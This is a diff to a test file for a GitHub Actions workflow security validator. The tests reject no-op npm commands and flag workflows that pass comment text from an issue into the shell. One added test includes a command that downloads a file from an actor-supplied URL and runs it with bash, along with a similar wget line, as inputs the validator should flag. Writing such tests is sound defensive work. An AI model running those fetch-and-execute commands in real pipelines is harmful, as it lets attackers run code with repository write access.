@@ -153,7 +153,9 @@ test("rejects commands that only report success", () => {
     // An allowlisted executable still reports on itself rather than the
     // product when nothing points it at project code.
     "npm --version", "node --version", "node -v", "go version", "npm --prefix website",
-    "npm test && npm --version"
+    "npm test && npm --version",
+    // `npm run` lists the scripts and exits zero; the script name is the target.
+    "npm run", "npm run --silent", "npm exec", "npm --prefix website run"
   ];
   for (const run of noOps) {
     const invalid = structuredClone(config);
@@ -1056,6 +1058,32 @@ test("a write-capable job may not fetch an actor-selected ref with git", () => {
   assert.deepEqual(validateWorkflowText(".github/workflows/example.yml", shellStep("git fetch origin main && npm ci")), []);
 });
 
+test("acquisition is refused by the input, whatever tool would do the fetching", () => {
+  const withEnv = (run) =>
+    `on: issue_comment\npermissions:\n  contents: write\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          URL: \${{ github.event.comment.body }}\n        run: ${run}\n`;
+  for (const run of [
+    'curl -o payload "$URL" && bash payload',
+    'wget -O payload "$URL"',
+    "node fetch.mjs",
+    "echo done"
+  ]) {
+    assert.match(
+      validateWorkflowText(".github/workflows/example.yml", withEnv(run)).join("\n"),
+      /names an actor-controlled ref in its shell/,
+      run
+    );
+  }
+  // A managed script reads the payload from the event file, so nothing
+  // actor-controlled has to enter the environment in the first place.
+  assert.deepEqual(
+    validateWorkflowText(
+      ".github/workflows/example.yml",
+      "on: issue_comment\npermissions:\n  contents: write\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          GITHUB_TOKEN: ${{ github.token }}\n        run: node scripts/handle-event.mjs\n"
+    ),
+    []
+  );
+});
+
 test("a workflow-level run default reaches into the isolated checkout too", () => {
   const withDefault = (root, job) =>
     `on: issue_comment\npermissions:\n  contents: write\n${root}jobs:\n  a:\n    runs-on: ubuntu-latest\n${job}    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}\n          path: candidate\n      - run: npm ci\n`;
@@ -1349,9 +1377,13 @@ test("trusted baseline verification is repository-identity and run-SHA bound", (
   const codeowners = readFileSync(resolve(".github/CODEOWNERS"), "utf8");
   assert.match(workflow, /run: node scripts\/verify-baseline-source\.mjs/);
   assert.match(script, /GITHUB_REPOSITORY !== "kiaquila\/web-design"/);
-  assert.match(script, /\(RUN_HEAD_SHA \?\? ""\) !== \(ASSOCIATED_HEAD_SHA \?\? ""\)/);
+  // The run SHA and the associated pull-request head still have to agree, and
+  // both now come from the event payload rather than from interpolated env.
+  assert.match(script, /runHeadSha !== associatedHeadSha/);
+  assert.match(script, /readFileSync\(GITHUB_EVENT_PATH, "utf8"\)/);
+  assert.match(script, /head_sha: runHeadSha/);
   assert.match(workflow, /ref: \$\{\{ github\.event\.workflow_run\.head_sha \}\}/);
-  assert.match(workflow, /HEAD_SHA: \$\{\{ github\.event\.workflow_run\.head_sha \}\}/);
+  assert.equal(/^\s+[A-Z_]+: \$\{\{ github\.event\./m.test(workflow), false);
   assert.match(codeowners, /^\/\.github\/ @kiaquila$/m);
   assert.match(codeowners, /^\/scripts\/ @kiaquila$/m);
 });
